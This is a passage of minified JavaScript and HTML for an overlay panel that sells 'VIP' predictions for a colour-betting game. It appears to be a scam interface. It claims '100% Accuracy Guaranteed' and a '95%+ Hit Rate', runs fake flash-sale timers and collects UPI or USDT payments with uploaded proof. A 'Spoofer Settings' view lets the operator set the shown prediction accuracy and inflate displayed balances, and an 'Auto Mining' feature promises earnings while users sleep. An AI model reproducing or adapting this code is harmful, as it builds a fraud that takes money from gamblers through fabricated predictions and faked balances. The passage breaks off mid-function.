        <div class="vip-tg-ring">
          <svg viewBox="0 0 24 24" width="26" height="26" fill="white">
            <path
              d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"
            />
          </svg>
        </div>
        <h3 class="vip-title">Signals. Every round.</h3>
        <p class="vip-pitch">
          Our members get the signal 15s before each game starts. No noise, no
          spam — just the edge.
        </p>
      </div>
      <div class="vip-stats">
        <div class="vip-stat">
          <span class="stat-val">95%+</span>
          <span class="stat-lbl">Hit Rate</span>
        </div>
        <div class="vip-stat">
          <span class="stat-val">20K+</span>
          <span class="stat-lbl">Members</span>
        </div>
        <div class="vip-stat">
          <span class="stat-val">Free</span>
          <span class="stat-lbl">Always</span>
        </div>
      </div>
      <button class="vip-cta" id="btn-tg-join">
        <svg viewBox="0 0 24 24" width="15" height="15" fill="white">
          <path
            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"
          />
        </svg>
        Open Telegram
        <svg
          class="vip-arrow"
          viewBox="0 0 24 24"
          width="14"
          height="14"
          fill="none"
          stroke="white"
          stroke-width="2.5"
          stroke-linecap="round"
          stroke-linejoin="round"
        >
          <path d="M5 12h14M13 6l6 6-6 6" />
        </svg>
      </button>
      <p class="vip-note">No Account Needed · 100% Free</p>
    </div>
    <div class="view view-vip">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">VIP Access</span>
        <span class="vip-invite-pill">
          <span class="live-pip"></span>
          Private
        </span>
      </div>
      <div class="vip-pricing-shell">
        <div class="vip-offer-card">
          <div class="vip-balls-track" aria-hidden="true">
            <img
              src="/assets/png/ball_0-Ca74Ns3T.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_1-DFUEzKvm.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_2-BA1HkQbr.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_3-CSGWgLyY.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_4-CU90k0Z5.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_5-DD5VBkEF.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_6-CRRe003w.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_7-Cf2z_aqK.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_8-BWd7rcUJ.png"
              class="vip-ball"
              alt=""
            />
            <img
              src="/assets/png/ball_9-DDw5YEZU.png"
              class="vip-ball"
              alt=""
            />
          </div>
          <div class="vip-flash-strip">
            <div class="vip-flash-copy">
              <span class="vip-flash-badge">Flash Drop</span>
              <span class="vip-flash-saving">Save ₹900 today</span>
            </div>
            <div class="vip-flash-clock">
              <span>Ends in</span>
              <strong data-vip-flash-timer>02:00:00</strong>
            </div>
          </div>
          <div class="vip-perks">
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">Get Number Prediction</span>
                <span class="vip-perk-desc">
                  Get exact winning number before result
                </span>
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">100% Accuracy Guaranteed</span>
                <span class="vip-perk-desc">
                  Every prediction verified with past results
                </span>
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">Number + Color + Big/Small</span>
                <span class="vip-perk-desc">
                  All three markets covered in one signal
                </span>
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
            <div class="vip-perk-item">
              <svg class="vip-perk-mark" viewBox="0 0 16 16">
                <path d="M3.5 8.2l2.8 2.8 6.2-6.4" />
              </svg>
              <div class="vip-perk-content">
                <span class="vip-perk-title">Auto-Mining Built In</span>
                <span class="vip-perk-desc">
                  Set it once, earn while you sleep
                </span>
              </div>
              <svg class="vip-perk-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </div>
          </div>
          <div class="vip-offer-foot">
            <div class="vip-price-line">
              <span class="vip-price-old">₹2,399</span>
              <span class="vip-price-amt">₹1,499</span>
              <span class="vip-price-unit">/ week</span>
            </div>
            <p class="vip-price-meta">UPI flash price · Crypto stays $24</p>
            <button class="vip-checkout-btn" id="btn-vip-checkout">
              Join Now
            </button>
          </div>
        </div>
      </div>
    </div>
    <div class="view view-vip-pay">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-pay-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Select Payment</span>
        <button class="vip-hist-btn" id="btn-vip-history" aria-label="History">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <circle cx="12" cy="12" r="10" />
            <polyline points="12 6 12 12 16 14" />
          </svg>
        </button>
      </div>
      <div class="vip-pay-shell">
        <div class="vip-flash-strip vip-flash-strip-pay">
          <div class="vip-flash-copy">
            <span class="vip-flash-badge">Limited Drop</span>
            <span class="vip-flash-saving">₹900 instant saving</span>
          </div>
          <div class="vip-flash-clock">
            <span>Ends in</span>
            <strong data-vip-flash-timer>02:00:00</strong>
          </div>
        </div>
        <div class="vip-pay-card">
          <div class="vip-pay-summary">
            <span class="vip-pay-summary-lbl">UPI Flash Price</span>
            <span class="vip-pay-summary-amt">
              <s>₹2,399</s>
              ₹1,499
            </span>
          </div>
          <div class="vip-pay-options">
            <button class="vip-pay-opt vip-pay-upi" id="btn-pay-upi">
              <div class="vip-pay-opt-icon">
                <svg viewBox="0 0 24 24">
                  <path
                    d="M21 7H3a2 2 0 00-2 2v10a2 2 0 002 2h18a2 2 0 002-2V9a2 2 0 00-2-2zm0 2v2h-3a2 2 0 100 4h3v2H3V9h18zm-5 2h1v2h-1v-2z"
                  />
                </svg>
              </div>
              <div class="vip-pay-opt-body">
                <div class="vip-pay-opt-top">
                  <span class="vip-pay-opt-name">UPI</span>
                  <span class="card-badge badge-upi">Instant</span>
                </div>
                <span class="vip-pay-opt-desc">GPay, PhonePe, Paytm, QR</span>
              </div>
              <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </button>
            <button class="vip-pay-opt vip-pay-crypto" id="btn-pay-crypto">
              <div class="vip-pay-opt-icon">
                <svg viewBox="0 0 24 24">
                  <path
                    d="M12 2l9 5.5v9L12 22l-9-5.5v-9L12 2zm0 2.2L5.5 8.5 12 12.8l6.5-4.3L12 4.2zm7.5 6.1L12 14.6 4.5 10.3v6.7L12 20.8l7.5-3.8v-6.7z"
                  />
                </svg>
              </div>
              <div class="vip-pay-opt-body">
                <div class="vip-pay-opt-top">
                  <span class="vip-pay-opt-name">Crypto</span>
                  <span class="card-badge badge-crypto">USDT/TRX</span>
                </div>
                <span class="vip-pay-opt-desc">Fixed price · $24 USDT</span>
              </div>
              <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24">
                <path d="M9 5l7 7-7 7" />
              </svg>
            </button>
          </div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust">
            <span class="status-dot"></span>
            Safe Payments
          </span>
          <span class="vip-pay-trust-sep">·</span>
          <span>Secure Checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-vip-checkout">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-checkout-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label" id="vip-checkout-title">Payment</span>
      </div>
      <div class="vip-checkout-shell">
        <div class="vip-checkout-card">
          <div class="vip-checkout-head">
            <div class="vip-checkout-stat">
              <span class="vip-checkout-stat-lbl">Offer Timer</span>
              <span class="vip-checkout-stat-val" id="vip-checkout-timer">
                02:00:00
              </span>
            </div>
            <div class="vip-checkout-stat vip-checkout-stat-amt">
              <span class="vip-checkout-stat-lbl">Amount</span>
              <span class="vip-checkout-stat-val" id="vip-checkout-amount">
                ₹1,499
              </span>
            </div>
          </div>
          <div class="vip-checkout-qr">
            <div class="vip-checkout-qr-frame">
              <img id="vip-qr-img" src="" alt="Scan to pay" />
            </div>
            <p class="vip-checkout-qr-hint">Scan With Your Payment App</p>
          </div>
          <div class="vip-checkout-detail-row">
            <span class="vip-detail-lbl">Order ID</span>
            <span class="vip-detail-val" id="vip-order-id">—</span>
          </div>
          <div class="vip-checkout-payto">
            <div class="vip-checkout-payto-hdr">
              <span class="vip-detail-lbl" id="vip-address-lbl">UPI ID</span>
              <span
                class="vip-network-lbl"
                id="vip-network-lbl"
                style="display: none"
              >
                TRC20
              </span>
            </div>
            <div class="vip-checkout-payto-row">
              <span class="vip-address-val" id="vip-address-val">—</span>
              <button
                type="button"
                class="vip-copy-btn"
                id="btn-vip-copy"
                aria-label="Copy"
              >
                Copy
              </button>
            </div>
            <button
              type="button"
              id="vip-upi-hint"
              class="vip-upi-hint"
              style="display: none"
            >
              <svg
                viewBox="0 0 24 24"
                width="12"
                height="12"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
              >
                <path
                  d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"
                />
              </svg>
              Change UPI ID
            </button>
          </div>
          <div class="vip-checkout-foot">
            <button class="vip-checkout-btn" id="btn-vip-confirm">
              Confirm Payment
            </button>
          </div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust">
            <span class="status-dot"></span>
            Safe payments
          </span>
          <span class="vip-pay-trust-sep">·</span>
          <span>Secure checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-vip-submit">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-submit-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Submit Proof</span>
      </div>
      <div class="vip-checkout-shell">
        <div class="vip-checkout-card">
          <div class="vip-proof-section">
            <label class="vip-proof-lbl" for="vip-utr-input">
              UTR / Transaction Hash
            </label>
            <input
              type="text"
              id="vip-utr-input"
              class="vip-proof-input"
              placeholder="12-digit UTR or TxHash"
              autocomplete="off"
              spellcheck="false"
            />
          </div>
          <div class="vip-proof-section">
            <label class="vip-proof-lbl">Payment Screenshot</label>
            <div class="vip-file-zone" id="vip-file-zone">
              <input type="file" id="vip-file-input" accept="image/*" hidden />
              <div class="vip-file-placeholder" id="vip-file-placeholder">
                <svg
                  viewBox="0 0 24 24"
                  width="20"
                  height="20"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
                  <circle cx="8.5" cy="8.5" r="1.5"></circle>
                  <polyline points="21 15 16 10 5 21"></polyline>
                </svg>
                <span>Tap to Upload</span>
              </div>
              <img
                id="vip-file-preview"
                class="vip-file-preview"
                src=""
                alt="Payment screenshot preview"
              />
              <button
                type="button"
                class="vip-file-remove"
                id="btn-vip-file-remove"
                aria-label="Remove screenshot"
              >
                &times;
              </button>
            </div>
          </div>
          <div class="vip-checkout-foot">
            <button class="vip-checkout-btn" id="btn-vip-submit-proof">
              Submit Proof
            </button>
          </div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust">
            <span class="status-dot"></span>
            Safe payments
          </span>
          <span class="vip-pay-trust-sep">·</span>
          <span>Secure checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-vip-history">
      <div class="vip-header">
        <button class="back-btn" id="btn-vip-history-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Order History</span>
      </div>
      <div class="vip-history-shell">
        <div class="vip-history-card">
          <div class="vip-history-list" id="vip-history-list"></div>
        </div>
        <div class="vip-pay-foot">
          <span class="vip-pay-trust">
            <span class="status-dot"></span>
            Safe payments
          </span>
          <span class="vip-pay-trust-sep">·</span>
          <span>Secure checkout</span>
        </div>
      </div>
    </div>
    <div class="view view-settings">
      <div class="pro-top">
        <button class="back-btn" id="btn-settings-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="settings-header-label">Spoofer Settings</span>
      </div>
      <div class="spoofer-card">
        <div class="spoofer-section">
          <label class="spoofer-label">Prediction Accuracy</label>
          <div class="spoofer-row">
            <input
              type="range"
              id="spoof-acc-range"
              min="0"
              max="100"
              step="1"
              value="70"
            />
            <input
              type="number"
              id="spoof-acc-num"
              min="0"
              max="100"
              value="70"
            />
            <span class="spoofer-unit">%</span>
          </div>
        </div>
        <div class="spoofer-section">
          <label class="spoofer-label">Spoof Balance Offset</label>
          <div class="spoofer-row">
            <input
              type="number"
              id="spoof-bal"
              min="0"
              step="100"
              value="5000"
            />
            <span class="spoofer-unit">₹</span>
          </div>
        </div>
        <button class="spoofer-reset" id="btn-spoof-reset">
          Reset Defaults
        </button>
      </div>
      <div class="spoofer-card" style="margin-top: 10px">
        <label class="spoofer-label">Withdrawal Requests</label>
        <div id="spoof-withdrawals-list"></div>
      </div>
    </div>
    <div class="view view-pro">
      <div class="pro-top">
        <button class="back-btn" id="btn-pro-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <div class="pro-gameinfo">
          <div class="pro-gameinfo-row">
            <span class="pro-game-name" id="pro-mode">—</span>
            <span class="pro-live-badge">
              <span class="live-pip"></span>
              Live
            </span>
          </div>
          <span class="pro-round" id="pro-period">—</span>
        </div>
      </div>
      <div class="pro-timer-wrap" id="pro-timer-wrap">
        <div class="pro-timer-label">Time Remaining</div>
        <span class="pro-timer" id="pro-timer">00:00</span>
      </div>
      <div class="pro-card" id="pro-card">
        <div class="pro-scanning" id="pro-waiting">
          <div class="scan-rings">
            <div class="scan-ring-o"></div>
            <div class="scan-ring-i"></div>
          </div>
          <span class="scan-label" id="scan-lbl">
            Scanning
            <span class="s-dot"></span>
            <span class="s-dot"></span>
            <span class="s-dot"></span>
          </span>
        </div>
        <div class="pro-prediction" id="pro-prediction" style="display: none">
          <div class="streak-badge" id="streak-badge">
            <span>🔥</span>
            <span id="streak-text">—</span>
          </div>
          <div class="pred-hero">
            <div class="pred-glow" id="pred-glow"></div>
            <div class="pred-ball" id="hero-ball"></div>
          </div>
          <div class="pred-tags">
            <span class="pred-size" id="pred-pill">Big</span>
            <span class="pred-color" id="pred-color">Red</span>
          </div>
          <div class="pred-conf">
            <div class="conf-track">
              <div class="conf-fill" id="conf-fill"></div>
            </div>
            <span class="conf-pct" id="conf-pct">0%</span>
          </div>
          <div class="pred-history" id="pred-history">
            <span class="hist-label">Recent</span>
          </div>
        </div>
      </div>
    </div>
    <div class="view view-mining">
      <div class="vip-header">
        <button class="back-btn" id="btn-mining-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Auto Mining</span>
        <button
          class="mine-hist-btn"
          id="btn-mining-history"
          aria-label="History"
        >
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <circle cx="12" cy="12" r="10" />
            <polyline points="12 6 12 12 16 14" />
          </svg>
        </button>
        <span class="mine-energy-pill" style="display: none">
          <svg class="energy-svg" viewBox="0 0 24 24">
            <path d="M12 2L4.5 14h6v8L18 10h-6V2z" />
          </svg>
          <span id="mine-energy-count">10</span>
        </span>
      </div>
      <div class="mine-shell">
        <div class="mine-card">
          <div class="mine-row">
            <span class="mine-lbl">
              <svg
                class="mine-lbl-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <rect x="2" y="6" width="20" height="12" rx="2" />
                <path d="M22 10H2" />
                <circle cx="17" cy="14" r="1.5" />
              </svg>
              Available Balance
            </span>
            <span class="mine-val" id="mine-current-bal">₹5,000.00</span>
          </div>
          <div class="mine-row">
            <span class="mine-lbl">
              <svg
                class="mine-lbl-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <circle cx="12" cy="12" r="10" />
                <circle cx="12" cy="12" r="6" />
                <circle cx="12" cy="12" r="2" />
              </svg>
              Target Balance
            </span>
            <div class="mine-input-wrap">
              <span class="mine-symbol">₹</span>
              <input
                type="number"
                id="mine-target-goal"
                class="mine-input"
                min="100"
                step="100"
                value="10000"
                placeholder="10000"
              />
            </div>
          </div>
          <div class="mine-row">
            <span class="mine-lbl">
              <svg
                class="mine-lbl-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path
                  d="M12 22s-8-4.5-8-11.8A8 8 0 0 1 12 2a8 8 0 0 1 8 8.2c0 7.3-8 11.8-8 11.8z"
                />
                <circle cx="12" cy="10" r="3" />
              </svg>
              Stop Balance
            </span>
            <div class="mine-input-wrap">
              <span class="mine-symbol">₹</span>
              <input
                type="number"
                id="mine-stop-loss"
                class="mine-input"
                min="0"
                step="100"
                value=""
                placeholder="No Limit"
              />
            </div>
          </div>
          <div class="mine-terminal-section">
            <div class="mining-terminal" id="mine-console">
              <div class="console-line active">System ready to mine...</div>
            </div>
          </div>
          <div class="mine-card-foot">
            <button class="mine-cta" id="btn-mining-start">
              Start Mining · 1 Energy
            </button>
            <p class="mine-note">Stops Automatically at Target Balance</p>
          </div>
        </div>
      </div>
      <div
        class="mining-energy-modal"
        id="mining-energy-modal"
        style="display: none"
      >
        <button
          class="energy-modal-close"
          id="btn-energy-close"
          aria-label="Close"
        >
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path d="M18 6L6 18M6 6l12 12" />
          </svg>
        </button>
        <div class="energy-modal-content">
          <div class="energy-modal-icon">
            <svg
              viewBox="0 0 64 64"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <rect
                x="6"
                y="18"
                width="44"
                height="28"
                rx="6"
                stroke="currentColor"
                stroke-width="3.5"
              />
              <rect
                x="50"
                y="26"
                width="8"
                height="12"
                rx="3"
                fill="currentColor"
                opacity="0.3"
              />
              <rect
                x="12"
                y="24"
                width="8"
                height="16"
                rx="2"
                fill="currentColor"
                opacity="0.2"
              />
            </svg>
          </div>
          <div class="energy-modal-title">You're Out of Energy</div>
          <div class="energy-modal-desc">
            Each mining session uses one energy unit. Get a free boost below to
            start right away.
          </div>
          <div class="energy-modal-actions">
            <button class="energy-btn-primary" id="btn-energy-boost">
              Get Free Energy
            </button>
            <button class="energy-btn-secondary" id="btn-energy-topup">
              Buy More Energy
            </button>
          </div>
        </div>
      </div>
      <div
        class="mining-history-modal"
        id="mining-history-modal"
        style="display: none"
      >
        <button
          class="energy-modal-close"
          id="btn-history-close"
          aria-label="Close"
        >
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <path d="M18 6L6 18M6 6l12 12" />
          </svg>
        </button>
        <div class="history-modal-content">
          <div class="history-modal-title">Mining History</div>
          <div class="history-list" id="mining-history-list"></div>
          <button class="history-clear-btn" id="btn-history-clear">
            Clear History
          </button>
        </div>
      </div>
    </div>
  </div>
  <div class="gate-view" style="display: none">
    <div class="gate-icon">
      <svg
        width="20"
        height="20"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="2.5"
        stroke-linecap="round"
        stroke-linejoin="round"
      >
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
      </svg>
    </div>
    <h3 class="gate-title">Predictions Locked</h3>
    <div class="gate-bal-wrap">
      <span class="gate-balance" id="gate-bal">₹0.00</span>
    </div>
    <p class="gate-desc">
      Minimum ₹100 balance required to
      <br />
      access real-time predictions.
    </p>
    <div class="gate-actions">
      <button class="gate-btn btn-deposit">Deposit Now</button>
      <button class="gate-btn btn-telegram">Join Telegram</button>
    </div>
  </div>
</div>
`;
          this._logo = n.querySelector(".logo");
          this._panel = n.querySelector(".panel");
          this._header = n.querySelector(".panel-header");
          this._closeBtn = n.querySelector(".close-btn");
          this._gateView = n.querySelector(".gate-view");
          this._body = n.querySelector(".panel-body");
          this._gateBal = n.querySelector("#gate-bal");
          Do(n);
          Zn(this, Xn("logo"));
          we(this, this._logo, {
            onTap: () => this._showPanel(),
          });
          Se(this, this._header, this._panel);
          this._closeBtn.addEventListener("pointerdown", (g) => g.stopPropagation());
          this._closeBtn.addEventListener("click", () => {
            this._lastActiveTime = Date.now();
            if (this._gateView.style.display === "block") {
              this._activeSection = "menu";
              this._gateView.style.display = "none";
              this._body.style.display = "block";
              this._setView("menu");
            }
            this._showLogo();
          });
          n.querySelector(".btn-deposit")?.addEventListener("click", () => (location.href = Ro));
          n.querySelector(".btn-telegram")?.addEventListener("click", () =>
            window.open("https://telegram.dog/predictwingoo", "_blank")
          );
          n.querySelector("#btn-pro")?.addEventListener("click", () => {
            this._lastActiveTime = Date.now();
            let bal = this._getLiveBalance();
            if (bal < 100) {
              this._activeSection = "menu";
              if (this._gateBal) this._gateBal.textContent = "₹" + Number(bal).toFixed(2);
              this._body.style.display = "none";
              this._gateView.style.display = "block";
            } else {
              this._activeSection = "pro";
              this._gateView.style.display = "none";
              this._body.style.display = "block";
              this._setView("pro");
              ce(-1);
              tn("loading");
              Te();
            }
          });
          n.querySelector("#btn-status-tg")?.addEventListener("click", () => this._setView("tg"));
          n.querySelector("#btn-vip")?.addEventListener("click", () => this._setView("vip"));
          n.querySelector("#btn-mine")?.addEventListener("click", () => {
            this._activeSection = "mining";
            this._setView("mining");
            this._checkBalance();
          });
          let backToMenu = () => {
            this._lastActiveTime = Date.now();
            this._activeSection = "menu";
            this._gateView.style.display = "none";
            this._body.style.display = "block";
            this._setView("menu");
          };
          n.querySelector("#btn-tg-back")?.addEventListener("click", backToMenu);
          n.querySelector("#btn-vip-back")?.addEventListener("click", backToMenu);
          n.querySelector("#btn-pro-back")?.addEventListener("click", backToMenu);
          n.querySelector("#btn-gate-back")?.addEventListener("click", backToMenu);
          n.querySelector("#btn-vip-pay-back")?.addEventListener("click", () => this._setView("vip"));
          n.querySelector("#btn-tg-join")?.addEventListener("click", () =>
            window.open("https://telegram.dog/predictwingoo", "_blank")
          );
          n.querySelector("#btn-vip-checkout")?.addEventListener("click", () => this._setView("vip-pay"));
          n.querySelector("#btn-pay-upi")?.addEventListener("click", () => this._startVipCheckout("upi"));
          n.querySelector("#btn-pay-crypto")?.addEventListener("click", () => this._startVipCheckout("crypto"));
          n.querySelector("#btn-vip-checkout-back")?.addEventListener("click", () => {
            if ((this._setView("vip-pay"), vn)) clearInterval(vn);
          }),
          n.querySelector("#btn-vip-confirm").addEventListener("click", () => {
            (this._setView("vip-submit"),
              (n.querySelector("#vip-utr-input").value = ""),
              (n.querySelector("#vip-file-input").value = ""),
              (n.querySelector("#vip-file-preview").style.display = "none"),
              (n.querySelector("#vip-file-placeholder").style.display = "flex"),
              (n.querySelector("#btn-vip-file-remove").style.display = "none"));
          }),
          n.querySelector("#btn-vip-submit-back").addEventListener("click", () => {
            this._setView("vip-checkout");
          }),
          n.querySelector("#btn-vip-history").addEventListener("click", () => {
            (this._renderVipHistory(), this._setView("vip-history"), this._syncVipHistory());
          }),
          n.querySelector("#btn-vip-history-back").addEventListener("click", () => {
            this._setView("vip-pay");
          }),
          n.querySelector("#vip-file-zone").addEventListener("click", () => {
            n.querySelector("#vip-file-input").click();
          }),
          n.querySelector("#vip-file-input").addEventListener("change", (g) => {
            let M = g.target.files[0];
            if (M) {
              let W = new FileReader();
              ((W.onload = (L) => {
                ((n.querySelector("#vip-file-preview").src = L.target.result),
                  (n.querySelector("#vip-file-preview").style.display = "block"),
                  (n.querySelector("#vip-file-placeholder").style.display = "none"),
                  (n.querySelector("#btn-vip-file-remove").style.display = "flex"));
              }),
                W.readAsDataURL(M));
            }
          }),
          n.querySelector("#btn-vip-file-remove").addEventListener("click", (g) => {
            (g.preventDefault(),
              g.stopPropagation(),
              (n.querySelector("#vip-file-input").value = ""));
            let M = n.querySelector("#vip-file-preview");
            ((M.src = ""),
              (M.style.display = "none"),
              (n.querySelector("#vip-file-placeholder").style.display = "flex"),
              (n.querySelector("#btn-vip-file-remove").style.display = "none"));
          }),
          n.querySelector("#btn-vip-submit-proof").addEventListener("click", () => {
            let g = n.querySelector("#vip-utr-input"),
              M = n.querySelector("#vip-file-input"),
              W = g.value.trim();
            if (!W) {
              alert("Please enter your UTR / Transaction Hash");
              return;
            }
            let L = n.querySelector("#btn-vip-submit-proof");
            ((L.textContent = "Uploading..."), (L.disabled = !0));
            let q = new FormData();
            (q.append("utr", W),
              q.append("type", this._checkoutType || "upi"),
              q.append(
                "amount",
                this._checkoutType === "crypto"
                  ? K.cryptoAmountUsd.toFixed(2) + " USDT"
                  : "₹" + K.amount,
              ));
            let y = "Unknown";
            try {
              y = sessionStorage.getItem("wg_user") || localStorage.getItem("wg_user") || "Unknown";
            } catch (a) {}
            if ((q.append("user", y), M.files[0])) q.append("screenshot", M.files[0]);
            fetch("/ar-api/vip-submit", {
              method: "POST",
              body: q,
            })
              .then((a) => a.json())
              .then((a) => {
                if (a.ok) {
                  let u = [];
                  try {
                    u = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
                  } catch (v) {}
                  (u.unshift({
                    type: this._checkoutType || "upi",
                    utr: W,
                    date: Date.now(),
                    status: "Pending",
                  }),
                    localStorage.setItem("wg_vip_orders", JSON.stringify(u)),
                    (L.textContent = "Submitted ✓"),
                    (L.style.cssText = "background: #10b981; color: #fff; border-color: #10b981;"),
                    setTimeout(() => {
                      ((L.textContent = "Submit Proof"),
                        (L.style.cssText = ""),
                        (L.disabled = !1),
                        this._renderVipHistory(),
                        this._setView("vip-history"));
                    }, 1500));
                } else
                  (alert(a.error || "Failed to submit proof. Please try again."),
                    (L.textContent = "Submit Proof"),
                    (L.disabled = !1));
              })
              .catch((a) => {
                (console.error(a),
                  alert("Connection error. Please try again."),
                  (L.textContent = "Submit Proof"),
                  (L.disabled = !1));
              });
          }),
          n.querySelector("#btn-vip-copy").addEventListener("click", () => {
            let g = n.querySelector("#vip-address-val").textContent;
            ((W) => {
              let L = document.createElement("textarea");
              ((L.value = W),
                (L.style.position = "fixed"),
                (L.style.opacity = "0"),
                (L.style.left = "-9999px"),
                n.appendChild(L),
                L.focus(),
                L.select(),
                L.setSelectionRange(0, 99999));
              let q = !1;
              try {
                q = document.execCommand("copy");
              } catch (y) {}
              if ((n.removeChild(L), q)) return Promise.resolve();
              if (navigator.clipboard) return navigator.clipboard.writeText(W);
              return Promise.reject();
            })(g)
              .then(() => {
                let W = n.querySelector("#btn-vip-copy"),
                  L = W.textContent;
                ((W.textContent = "Copied!"),
                  W.classList.add("copied"),
                  setTimeout(() => {
                    ((W.textContent = L), W.classList.remove("copied"));
                  }, 2000));
              })
              .catch((W) => {
